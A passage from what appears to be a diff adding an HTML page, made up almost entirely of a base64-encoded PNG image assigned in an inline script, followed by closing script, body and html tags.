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";
+        }
+      });
+    });
+  </script>
+</body>
+</html>
